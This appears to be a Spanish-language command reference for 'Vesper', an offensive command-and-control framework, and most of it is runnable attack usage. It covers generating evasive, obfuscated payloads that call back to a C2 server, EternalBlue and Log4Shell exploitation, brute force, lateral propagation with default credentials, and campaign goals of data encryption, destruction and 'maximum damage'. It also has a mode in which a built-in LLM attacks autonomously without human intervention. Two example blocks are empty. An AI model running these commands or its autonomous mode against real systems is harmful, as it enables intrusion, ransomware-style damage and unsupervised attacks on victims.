# Vesper — Referencia CLI Completa

> Todos los comandos disponibles en el binario `vesper` con sintaxis, flags, y ejemplos.
> Versión: 3.0 · Build: Go 1.25

---

## Sintaxis General

```
vesper [comando] [subcomando] [flags]
```

Flags globales disponibles en todos los comandos:

| Flag | Descripción |
|------|-------------|
| `--config <path>` | Ruta al archivo de configuración (default: `config.yaml`) |
| `--verbose` / `-v` | Salida detallada |
| `--json` | Salida en formato JSON |
| `--quiet` / `-q` | Suprimir salida no esencial |
| `--help` / `-h` | Mostrar ayuda del comando |

---

## Campaign — Gestión de Campañas

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `campaign start` | `vesper campaign start --name <n> --target <ip/cidr> --goal <g> --profile <p> [--auto]` | Inicia una nueva campaña de Red Team |
| `campaign status` | `vesper campaign status [--json]` | Estado de la campaña activa |
| `campaign list` | `vesper campaign list [--status active\|completed]` | Lista todas las campañas |
| `campaign pause` | `vesper campaign pause <campaign_id>` | Pausa una campaña activa |
| `campaign resume` | `vesper campaign resume <campaign_id>` | Reanuda campaña pausada |
| `campaign report` | `vesper campaign report <campaign_id> [--format json\|markdown\|pdf]` | Genera reporte de campaña |
| `campaign delete` | `vesper campaign delete <campaign_id>` | Elimina campaña y sus datos |

### Flags de `campaign start`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--name` | Sí | String | Nombre identificador de la campaña |
| `--target` / `-t` | Sí | IP o CIDR | Rango de IPs objetivo |
| `--goal` / `-g` | Sí | `domain_admin`, `exfil_encrypt`, `persistence`, `destruction` | Objetivo final |
| `--profile` / `-p` | Sí | `stealth`, `balanced`, `aggressive` | Perfil de velocidad/ruido |
| `--auto` | No | Boolean | Modo autónomo (IA decide sin intervención) |
| `--modules` | No | Lista CSV | Módulos específicos a usar |
| `--timeout` | No | Duración (e.g. `2h`) | Tiempo máximo de campaña |

### Ejemplos

```bash
# Campaña agresiva con cifrado
vesper campaign start --name operacion-cobra --target 192.168.1.0/24 --goal exfil_encrypt --profile aggressive --auto

# Campaña sigilosa para obtener domain admin
vesper campaign start --name silent-night --target 10.0.0.0/16 --goal domain_admin --profile stealth

# Ver estado
vesper campaign status

# Ver estado en JSON (para scripting)
vesper campaign status --json

# Listar solo campañas activas
vesper campaign list --status active

# Pausar campaña
vesper campaign pause operacion-cobra

# Reanudar
vesper campaign resume operacion-cobra

# Generar reporte PDF
vesper campaign report operacion-cobra --format pdf
```

---

## Recon — Reconocimiento

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `recon scan` | `vesper recon scan --target <ip/cidr> [--ports <range>] [--stealth]` | Escaneo TCP/UDP de puertos |
| `recon osint` | `vesper recon osint --domain <d> [--github] [--shodan]` | Recolección OSINT pasiva |
| `recon dns` | `vesper recon dns --domain <d> [--bruteforce]` | Enumeración DNS |
| `recon vuln` | `vesper recon vuln --target <ip> [--service all]` | Escaneo de vulnerabilidades |

### Flags de `recon scan`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--target` / `-t` | Sí | IP o CIDR | Objetivo del escaneo |
| `--ports` / `-p` | No | Rango (e.g. `1-65535`, `1-1000`) | Puertos a escanear (default: top 1000) |
| `--stealth` | No | Boolean | Modo sigiloso (SYN scan, timing lento) |
| `--udp` | No | Boolean | Incluir escaneo UDP |
| `--service` | No | Boolean | Detección de versión de servicios |
| `--os` | No | Boolean | Fingerprinting de SO |

### Ejemplos

```bash
# Escaneo rápido
vesper recon scan --target 10.0.0.0/24

# Escaneo completo con detección de servicios
vesper recon scan --target 10.0.0.5 --ports 1-65535 --service

# Escaneo sigiloso
vesper recon scan --target 192.168.1.0/24 --stealth

# OSINT de dominio
vesper recon osint --domain target.com --github --shodan

# Enumeración DNS con bruteforce de subdominios
vesper recon dns --domain target.com --bruteforce

# Escaneo de vulnerabilidades
vesper recon vuln --target 10.0.0.5 --service all
```

---

## Agent — Gestión de Agentes

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `agent list` | `vesper agent list [--campaign <id>] [--status online\|dead]` | Lista agentes registrados |
| `agent interact` | `vesper agent interact <agent_id>` | Shell interactiva con agente |
| `agent generate` | `vesper agent generate --os <os> --arch <arch> --c2 <addr> [--stealth]` | Genera binario de agente |
| `agent tasks` | `vesper agent tasks <agent_id> [--list] [--add <cmd>]` | Gestión de tareas del agente |
| `agent kill` | `vesper agent kill <agent_id> [--reason <r>]` | Elimina agente remoto |

### Flags de `agent generate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--os` | Sí | `windows`, `linux`, `darwin` | Sistema operativo objetivo |
| `--arch` | Sí | `amd64`, `arm64` | Arquitectura del procesador |
| `--c2` | Sí | `host:port` | Dirección del servidor C2 |
| `--stealth` | No | Boolean | Aplicar técnicas de evasión básicas |
| `--name` | No | String | Nombre personalizado del binario |
| `--heartbeat` | No | Duración (e.g. `30s`) | Intervalo de heartbeat |

### Ejemplos

```bash
# Listar todos los agentes online
vesper agent list --status online

# Listar agentes de una campaña específica
vesper agent list --campaign operacion-cobra

# Generar agente Windows con evasión
vesper agent generate --os windows --arch amd64 --c2 10.0.0.1:8443 --stealth

# Interactuar con agente
vesper agent interact agent-7f3a

# Asignar tarea
vesper agent tasks agent-7f3a --add "whoami && ipconfig /all"

# Eliminar agente
vesper agent kill agent-7f3a --reason "detected by EDR"
```

---

## Exploit — Explotación

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `exploit scan` | `vesper exploit scan --target <ip> [--risk safe\|medium\|high]` | Escanea vectores de explotación |
| `exploit run` | `vesper exploit run --target <ip> --cve <cve> [--risk <level>]` | Ejecuta exploit específico |
| `exploit cve` | `vesper exploit cve <CVE-ID> --target <ip>` | Ejecuta exploit por CVE |
| `exploit bruteforce` | `vesper exploit bruteforce <service> <target>` | Fuerza bruta contra servicio |

### Flags de `exploit run`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--target` / `-t` | Sí | IP | Host objetivo |
| `--cve` | Sí | CVE-YYYY-NNNNN | Identificador CVE |
| `--risk` | No | `safe`, `medium`, `high` | Nivel de riesgo aceptable |
| `--payload` | No | String | Payload personalizado |
| `--check` | No | Boolean | Solo verificar vulnerabilidad sin explotar |

### Ejemplos

```bash
# Escanear vectores de explotación
vesper exploit scan --target 10.0.0.5

# Ejecutar EternalBlue
vesper exploit run --target 10.0.0.5 --cve CVE-2017-0144

# Ejecutar Log4Shell
vesper exploit cve CVE-2021-44228 --target 10.0.0.22

# Fuerza bruta SSH
vesper exploit bruteforce ssh 10.0.0.5

# Solo verificar sin explotar
vesper exploit run --target 10.0.0.5 --cve CVE-2020-1472 --check
```

---

## AI — Asistente de Inteligencia Artificial

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `ai chat` | `vesper ai chat <prompt>` | Conversación con Specter (LLM) |
| `ai suggest` | `vesper ai suggest [--campaign <id>]` | Sugerencias tácticas de la IA |
| `ai auto` | `vesper ai auto [on\|off]` | Activar/desactivar modo autónomo |
| `ai analyze` | `vesper ai analyze <target_data>` | Análisis contextual de objetivo |
| `ai model` | `vesper ai model [list\|set <model>]` | Gestión de modelos LLM |

### Flags de `ai suggest`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--campaign` | No | ID | Campaña para contextualizar sugerencias |
| `--context` | No | String | Contexto adicional |
| `--max-tokens` | No | Número | Límite de tokens en respuesta |

### Ejemplos

```bash
# Chat interactivo con Specter
vesper ai chat "¿Cuál es el mejor vector de ataque para un servidor Apache 2.4.49?"

# Obtener sugerencias para campaña activa
vesper ai suggest --campaign operacion-cobra

# Activar modo autónomo
vesper ai auto on

# Desactivar modo autónomo
vesper ai auto off

# Analizar datos de target
vesper ai analyze "Windows Server 2019, SMB 445 open, no patches since 2022"

# Listar modelos disponibles
vesper ai model list

# Cambiar modelo
vesper ai model set llama3.2
```

---

## Lateral — Movimiento Lateral

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `lateral scan` | `vesper lateral scan --subnet <cidr>` | Descubre hosts alcanzables desde posición actual |
| `lateral propagate` | `vesper lateral propagate --subnet <cidr> --method <m>` | Propaga agente a hosts adyacentes |
| `lateral relay` | `vesper lateral relay [--add <ip:port>] [--chain]` | Configura cadena de relays |

### Flags de `lateral propagate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--subnet` | Sí | CIDR | Subred para propagación |
| `--method` / `-m` | Sí | `smb`, `ssh`, `wmi`, `psexec`, `rdp` | Método de propagación |
| `--target` | No | IP | Host específico (en lugar de toda la subred) |
| `--creds` | No | `user:pass` | Credenciales a utilizar |
| `--stealth` | No | Boolean | Propagación sigilosa (más lenta) |

### Ejemplos

```bash
# Escanear subred para movimiento lateral
vesper lateral scan --subnet 10.0.0.0/24

# Propagar via SMB
vesper lateral propagate --subnet 10.0.0.0/24 --method smb

# Propagar via SSH a host específico
vesper lateral propagate --target 10.0.0.15 --method ssh --creds root:toor

# Crear cadena de relay
vesper lateral relay --add 10.0.0.5:4444 --chain
```

---

## Payload — Generador de Payloads

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `payload generate` | `vesper payload generate --os <os> --arch <arch> --c2 <addr> [--stealth --evasion <level> --output <path>]` | Genera payload ejecutable |
| `payload list` | `vesper payload list` | Lista payloads generados |
| `payload obfuscate` | `vesper payload obfuscate --input <path> --method <m> [--packer upx]` | Ofusca payload existente |
| `payload info` | `vesper payload info` | Información del payload actual |

### Flags de `payload generate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--os` | Sí | `windows`, `linux`, `darwin` | SO objetivo |
| `--arch` | Sí | `amd64`, `arm64` | Arquitectura |
| `--c2` | Sí | `host:port` | Servidor C2 |
| `--stealth` | No | Boolean | Evasión básica |
| `--evasion` | No | `none`, `basic`, `stealth`, `paranoid` | Nivel de evasión |
| `--output` / `-o` | No | Path | Ruta de salida (default: `dist/`) |
| `--name` | No | String | Nombre del binario |
| `--format` | No | `exe`, `dll`, `shellcode`, `elf`, `macho` | Formato de salida |

### Flags de `payload obfuscate`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--input` / `-i` | Sí | Path | Archivo a ofuscar |
| `--method` / `-m` | Sí | `polymorphic`, `xor`, `aes` | Método de ofuscación |
| `--packer` | No | `upx`, `custom` | Packer a aplicar |
| `--key` | No | String | Clave para XOR/AES (autogenerada si se omite) |
| `--output` / `-o` | No | Path | Ruta de salida |

### Ejemplos

```bash
# Generar payload Windows con evasión stealth
vesper payload generate --os windows --arch amd64 --c2 10.0.0.1:8443 --evasion stealth

# Generar payload Linux ARM64
vesper payload generate --os linux --arch arm64 --c2 10.0.0.1:8443 --output /tmp/agent

# Generar shellcode
vesper payload generate --os windows --arch amd64 --c2 10.0.0.1:8443 --format shellcode

# Listar payloads
vesper payload list

# Ofuscar payload existente con polimorfismo + UPX
vesper payload obfuscate --input dist/agent-windows-amd64.exe --method polymorphic --packer upx

# Ofuscar con AES
vesper payload obfuscate --input dist/agent-linux-amd64 --method aes --key "my-secret-key"

# Info del payload actual
vesper payload info
```

---

## Listeners — Gestión de Listeners

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `listeners list` | `vesper listeners list` | Lista todos los listeners |
| `listeners add` | `vesper listeners add --type <t> --port <p> [--host <h>]` | Añade nuevo listener |
| `listeners remove` | `vesper listeners remove <id>` | Elimina listener |
| `listeners start` | `vesper listeners start <id>` | Inicia listener detenido |
| `listeners stop` | `vesper listeners stop <id>` | Detiene listener activo |

### Flags de `listeners add`

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--type` / `-t` | Sí | `tcp`, `http`, `https`, `dns`, `icmp`, `smb`, `ws`, `doh` | Protocolo del listener |
| `--port` / `-p` | Sí | Número | Puerto de escucha |
| `--host` / `-h` | No | IP | Interfaz de escucha (default: `0.0.0.0`) |
| `--name` | No | String | Nombre descriptivo |
| `--tls-cert` | No | Path | Certificado TLS (para https) |
| `--tls-key` | No | Path | Clave TLS (para https) |

### Tipos de Listener

| Tipo | Puerto Default | Descripción |
|------|---------------|-------------|
| `tcp` | 4444 | TCP raw — conexión directa |
| `http` | 80 | HTTP — tráfico web normal |
| `https` | 443 | HTTPS — tráfico cifrado web |
| `dns` | 53 | DNS — túnel en consultas DNS |
| `icmp` | N/A | ICMP — túnel en pings |
| `smb` | 445 | SMB — tráfico de archivos Windows |
| `ws` | 8446 | WebSocket — bidireccional |
| `doh` | 443 | DNS over HTTPS — máxima evasión |

### Ejemplos

```bash
# Listar listeners
vesper listeners list

# Añadir listener HTTPS
vesper listeners add --type https --port 443 --host 0.0.0.0

# Añadir listener DNS para evasión
vesper listeners add --type dns --port 53 --name "dns-tunnel"

# Añadir listener DoH
vesper listeners add --type doh --port 443 --name "doh-covert"

# Iniciar listener
vesper listeners start listener-1

# Detener listener
vesper listeners stop listener-1

# Eliminar listener
vesper listeners remove listener-1
```

---

## Dashboard — Control del Dashboard Web

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `dashboard` | `vesper dashboard [--port <p>] [--dev]` | Inicia dashboard web |
| `dashboard start` | `vesper dashboard start [--port <p>] [--dev]` | Alias de `dashboard` |
| `dashboard stop` | `vesper dashboard stop` | Detiene dashboard |
| `dashboard status` | `vesper dashboard status` | Estado del dashboard |

### Flags

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `--port` / `-p` | No | Número | Puerto (default: 3000) |
| `--dev` | No | Boolean | Modo desarrollo (hot-reload) |
| `--no-browser` | No | Boolean | No abrir navegador automáticamente |

### Ejemplos

```bash
# Iniciar dashboard
vesper dashboard

# Iniciar en puerto custom
vesper dashboard --port 8080

# Modo desarrollo
vesper dashboard --dev

# Ver estado
vesper dashboard status

# Detener
vesper dashboard stop
```

---

## DB — Gestión de Base de Datos

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `db status` | `vesper db status` | Estado de la base de datos |
| `db migrate` | `vesper db migrate [--up\|--down]` | Ejecutar migraciones |
| `db backup` | `vesper db backup [--output <path>]` | Crear backup |
| `db restore` | `vesper db restore <path>` | Restaurar desde backup |

### Ejemplos

```bash
# Estado de la DB
vesper db status

# Migrar hacia arriba
vesper db migrate --up

# Rollback
vesper db migrate --down

# Backup
vesper db backup --output backups/vesper-$(date +%Y%m%d).db

# Restaurar
vesper db restore backups/vesper-20240101.db
```

---

## Lab — Entorno de Laboratorio

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `lab up` | `vesper lab up [--scenario <name>]` | Levantar laboratorio Docker |
| `lab down` | `vesper lab down` | Detener laboratorio |
| `lab status` | `vesper lab status` | Estado de contenedores |
| `lab scenario` | `vesper lab scenario [list\|load <name>]` | Gestión de escenarios |

### Escenarios Disponibles

| Escenario | Descripción |
|-----------|-------------|
| `ctf_basic` | CTF básico con 5 targets vulnerables |
| `ad_environment` | Simulación Active Directory completa |
| `webapp_pentest` | Aplicaciones web vulnerables (OWASP Top 10) |
| `full_chain` | Ejercicio kill chain completo (7 fases) |

### Ejemplos

```bash
# Levantar lab default
vesper lab up

# Levantar escenario específico
vesper lab up --scenario ad_environment

# Ver estado
vesper lab status

# Listar escenarios
vesper lab scenario list

# Cargar escenario diferente (sin reiniciar)
vesper lab scenario load webapp_pentest

# Detener lab
vesper lab down
```

---

## Deploy — Despliegue de Módulos

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `deploy` | `vesper deploy <victim> [modules...] --strategy <s>` | Despliega módulos en víctima |

### Flags

| Flag | Requerido | Valores | Descripción |
|------|-----------|---------|-------------|
| `<victim>` | Sí | ID de agente | Víctima objetivo |
| `[modules...]` | Sí | Lista CSV | Módulos a desplegar |
| `--strategy` / `-s` | Sí | `stealth`, `targeted`, `scorched_earth` | Estrategia de despliegue |
| `--delay` | No | Duración | Retraso entre módulos |
| `--confirm` | No | Boolean | Confirmar antes de ejecutar |

### Estrategias

| Estrategia | Descripción |
|------------|-------------|
| `stealth` | Ejecución lenta, mínima huella, prioriza evasión |
| `targeted` | Balance entre velocidad y sigilo, módulos selectivos |
| `scorched_earth` | Ejecución inmediata de todos los módulos, máximo daño |

### Ejemplos

```bash

# Desplegar con confirmación
```

---

## Modules — Catálogo de Módulos

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `modules list` | `vesper modules list [category]` | Lista módulos (opcionalmente por categoría) |
| `modules categories` | `vesper modules categories` | Lista categorías disponibles |
| `modules info` | `vesper modules info <module>` | Información detallada de un módulo |

### Categorías

| Categoría | Cantidad | Descripción |
|-----------|----------|-------------|
| `exploit` | 16 | Exploits y escalación de privilegios |
| `auxiliary` | 3 | Escáneres y herramientas auxiliares |
| `post` | 2 | Post-explotación y persistencia |
| `v27` | 10 | Control total + Phishing |
| `v28` | 24 | Arsenal Ultimate |
| `v29` | 27 | Destrucción hardware + Stealth |
| `v3` | 5 | Orchestrator v3 + Platform Core |
| `omega` | 7 | Omega — Ataques de persistencia extrema |

### Ejemplos

```bash
# Listar todos los módulos
vesper modules list

# Listar categorías
vesper modules categories

# Info de módulo específico
```

---

## Victims — Gestión de Víctimas

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `victims list` | `vesper victims list` | Lista víctimas registradas |

### Ejemplo

```bash
vesper victims list
```

Salida:

```
  ID          Hostname        OS              IP              Status      Modules
  victim01    DESKTOP-ABC     Windows 10      10.0.0.15       active      3
  victim02    srv-web-01      Ubuntu 22.04    10.0.0.22       active      1
  victim03    dc01            Windows Server  10.0.0.1        dormant     5
```

---

## C2 — Comando y Control

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `c2 listen` | `vesper c2 listen` | Inicia servidor C2 en modo listen-only |

### Ejemplo

```bash
# Iniciar C2 en modo escucha
vesper c2 listen
```

Inicia el servidor gRPC en el puerto configurado (`server.grpc_port: 8444`) y acepta conexiones de agentes sin iniciar campañas.

---

## Console — Shell Interactiva

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `console` | `vesper console` | Inicia shell interactiva tipo msfconsole |

### Ejemplo

```bash
./vesper console
```

Dentro de la consola se accede a todos los módulos con sintaxis `use`, `set`, `exploit`.

---

## Utilidades

| Comando | Sintaxis | Descripción |
|---------|----------|-------------|
| `version` | `vesper version` | Muestra versión del framework |
| `help` | `vesper help [command]` | Ayuda general o de comando específico |

### Ejemplos

```bash
vesper version
# Vesper v3.0.0 (build 2024-01-15, go1.25, 154 modules)

vesper help campaign
# Muestra ayuda detallada del comando campaign
```

---

## Tabla de Referencia Rápida — Todos los Comandos

| Comando Completo | Descripción Corta |
|------------------|-------------------|
| `vesper campaign start --name <n> --target <ip> --goal <g> --profile <p> [--auto]` | Iniciar campaña |
| `vesper campaign status` | Estado campaña |
| `vesper campaign list` | Listar campañas |
| `vesper campaign pause <id>` | Pausar campaña |
| `vesper campaign resume <id>` | Reanudar campaña |
| `vesper campaign report <id> [--format]` | Reporte |
| `vesper campaign delete <id>` | Eliminar campaña |
| `vesper recon scan --target <ip>` | Escaneo de red |
| `vesper recon osint --domain <d>` | OSINT pasivo |
| `vesper recon dns --domain <d>` | Enumeración DNS |
| `vesper recon vuln --target <ip>` | Escaneo vulns |
| `vesper agent list` | Listar agentes |
| `vesper agent interact <id>` | Interactuar agente |
| `vesper agent generate --os <os> --arch <arch> --c2 <addr>` | Generar agente |
| `vesper agent tasks <id>` | Tareas de agente |
| `vesper agent kill <id>` | Eliminar agente |
| `vesper exploit scan --target <ip>` | Escanear exploits |
| `vesper exploit run --target <ip> --cve <cve>` | Ejecutar exploit |
| `vesper exploit cve <CVE> --target <ip>` | Exploit por CVE |
| `vesper exploit bruteforce <service> <target>` | Fuerza bruta |
| `vesper ai chat <prompt>` | Chat IA |
| `vesper ai suggest [--campaign <id>]` | Sugerencias IA |
| `vesper ai auto [on\|off]` | Modo autónomo |
| `vesper ai analyze <data>` | Análisis IA |
| `vesper ai model [list\|set]` | Gestión modelos |
| `vesper lateral scan --subnet <cidr>` | Escaneo lateral |
| `vesper lateral propagate --subnet <cidr> --method <m>` | Propagación |
| `vesper lateral relay --add <ip:port>` | Cadena relay |
| `vesper payload generate --os <os> --arch <arch> --c2 <addr>` | Generar payload |
| `vesper payload list` | Listar payloads |
| `vesper payload obfuscate --input <path> --method <m>` | Ofuscar payload |
| `vesper payload info` | Info payload |
| `vesper listeners list` | Listar listeners |
| `vesper listeners add --type <t> --port <p>` | Añadir listener |
| `vesper listeners remove <id>` | Eliminar listener |
| `vesper listeners start <id>` | Iniciar listener |
| `vesper listeners stop <id>` | Detener listener |
| `vesper dashboard` | Iniciar dashboard |
| `vesper dashboard stop` | Detener dashboard |
| `vesper dashboard status` | Estado dashboard |
| `vesper db status` | Estado DB |
| `vesper db migrate` | Migraciones |
| `vesper db backup` | Backup DB |
| `vesper db restore <path>` | Restaurar DB |
| `vesper lab up` | Levantar lab |
| `vesper lab down` | Detener lab |
| `vesper lab status` | Estado lab |
| `vesper lab scenario [list\|load]` | Escenarios |
| `vesper deploy <victim> [modules] --strategy <s>` | Desplegar módulos |
| `vesper modules list [category]` | Listar módulos |
| `vesper modules categories` | Categorías |
| `vesper victims list` | Listar víctimas |
| `vesper c2 listen` | Servidor C2 |
| `vesper console` | Shell interactiva |
| `vesper version` | Versión |
| `vesper help` | Ayuda |

---

## Estado de Implementación

La siguiente tabla indica qué comandos están **completamente funcionales** y cuáles están en fase de **stub** (interfaz definida, lógica pendiente).

| Comando | Estado | Notas |
|---------|--------|-------|
| `vesper campaign status` | **FUNCIONAL** | Query a DB SQLite |
| `vesper campaign list` | **FUNCIONAL** | Query a DB |
| `vesper campaign pause` | **FUNCIONAL** | Señal al orquestador |
| `vesper campaign resume` | **FUNCIONAL** | Señal al orquestador |
| `vesper campaign report` | STUB | Generación de reportes pendiente |
| `vesper campaign delete` | STUB | Solo marca como eliminada |
| `vesper recon scan` | **FUNCIONAL** | Scanner TCP integrado en Go |
| `vesper recon osint` | **FUNCIONAL** | Módulo Python via bridge |
| `vesper recon dns` | **FUNCIONAL** | Enumeración DNS nativa |
| `vesper recon vuln` | STUB | Depende de integración CVE DB |
| `vesper agent list` | **FUNCIONAL** | gRPC AgentService |
| `vesper agent interact` | **FUNCIONAL** | Shell bidireccional via gRPC stream |
| `vesper agent generate` | **FUNCIONAL** | Cross-compile Go + evasión |
| `vesper agent tasks` | **FUNCIONAL** | Cola de tareas gRPC |
| `vesper agent kill` | **FUNCIONAL** | Señal de terminación al agente |
| `vesper exploit scan` | **FUNCIONAL** | Scanner de vectores locales |
| `vesper exploit run` | **FUNCIONAL** | Ejecución de exploits registrados |
| `vesper exploit cve` | PARCIAL | Solo CVEs con módulo implementado |
| `vesper exploit bruteforce` | **FUNCIONAL** | SSH, SMB, RDP, FTP |
| `vesper ai chat` | **FUNCIONAL** | Ollama integration |
| `vesper ai suggest` | **FUNCIONAL** | Contexto de campaña + LLM |
| `vesper ai auto` | **FUNCIONAL** | Toggle modo autónomo |
| `vesper ai analyze` | STUB | Análisis básico implementado |
| `vesper ai model` | **FUNCIONAL** | List/set modelos Ollama |
| `vesper lateral scan` | **FUNCIONAL** | ARP + ICMP + TCP discovery |
| `vesper lateral propagate` | **FUNCIONAL** | SMB, SSH, WMI |
| `vesper lateral relay` | STUB | Relay chain en desarrollo |
| `vesper payload generate` | **FUNCIONAL** | Cross-compile + evasión multi-nivel |
| `vesper payload list` | **FUNCIONAL** | Lista desde dist/ |
| `vesper payload obfuscate` | **FUNCIONAL** | XOR, AES, polimorfismo, UPX |
| `vesper payload info` | STUB | Metadata básica |
| `vesper listeners list` | **FUNCIONAL** | Lista listeners registrados |
| `vesper listeners add` | **FUNCIONAL** | TCP, HTTP, HTTPS, DNS, WS |
| `vesper listeners remove` | **FUNCIONAL** | Elimina y libera puerto |
| `vesper listeners start` | **FUNCIONAL** | Inicia goroutine de listener |
| `vesper listeners stop` | **FUNCIONAL** | Graceful shutdown |
| `vesper dashboard` | **FUNCIONAL** | API Go + Vue3 frontend |
| `vesper dashboard stop` | **FUNCIONAL** | Signal SIGTERM |
| `vesper dashboard status` | **FUNCIONAL** | Health check |
| `vesper db status` | **FUNCIONAL** | SQLite ping + stats |
| `vesper db migrate` | **FUNCIONAL** | Auto-migrate GORM |
| `vesper db backup` | **FUNCIONAL** | Copia fichero SQLite |
| `vesper db restore` | **FUNCIONAL** | Reemplaza fichero DB |
| `vesper lab up` | **FUNCIONAL** | docker compose up |
| `vesper lab down` | **FUNCIONAL** | docker compose down |
| `vesper lab status` | **FUNCIONAL** | docker compose ps |
| `vesper lab scenario` | PARCIAL | Solo `ctf_basic` y `full_chain` disponibles |
| `vesper deploy` | **FUNCIONAL** | Dispatch a agentes via gRPC |
| `vesper modules list` | **FUNCIONAL** | Registry dinámico |
| `vesper modules categories` | **FUNCIONAL** | Categorías del registry |
| `vesper victims list` | **FUNCIONAL** | Query DB de víctimas |
| `vesper c2 listen` | **FUNCIONAL** | gRPC server standalone |
| `vesper console` | **FUNCIONAL** | REPL con readline + autocompletado |
| `vesper version` | **FUNCIONAL** | Build info embebida |
| `vesper help` | **FUNCIONAL** | Cobra help system |

### Resumen

| Estado | Cantidad | Porcentaje |
|--------|----------|------------|
| **FUNCIONAL** | 44 | 85% |
| **PARCIAL** | 2 | 4% |
| **STUB** | 6 | 11% |

---

## Variables de Entorno

| Variable | Descripción | Default |
|----------|-------------|---------|
| `VESPER_CONFIG` | Ruta al archivo de configuración | `./config.yaml` |
| `VESPER_LOG_LEVEL` | Nivel de logging (`debug`, `info`, `warn`, `error`) | `info` |
| `VESPER_C2_HOST` | Override del host C2 | Config file |
| `VESPER_C2_PORT` | Override del puerto C2 | `8443` |
| `VESPER_DB_PATH` | Ruta a la base de datos SQLite | `./vesper.db` |
| `VESPER_OLLAMA_HOST` | Host de Ollama para IA | `localhost` |
| `VESPER_OLLAMA_PORT` | Puerto de Ollama | `11434` |
| `VESPER_LAB_NETWORK` | Red Docker para lab | `vesper-lab` |
| `VESPER_KILL_SWITCH` | Código del kill switch | Config file |
| `VESPER_NO_COLOR` | Deshabilitar colores en output | `false` |

---

## Códigos de Salida

| Código | Significado |
|--------|-------------|
| `0` | Éxito |
| `1` | Error general |
| `2` | Error de argumentos/flags inválidos |
| `3` | Error de conexión (C2, DB, Ollama) |
| `4` | Error de permisos |
| `5` | Kill switch activado |
| `10` | Campaña fallida |
| `11` | Agente no encontrado |
| `12` | Módulo no encontrado |
| `99` | Error interno no recuperable |
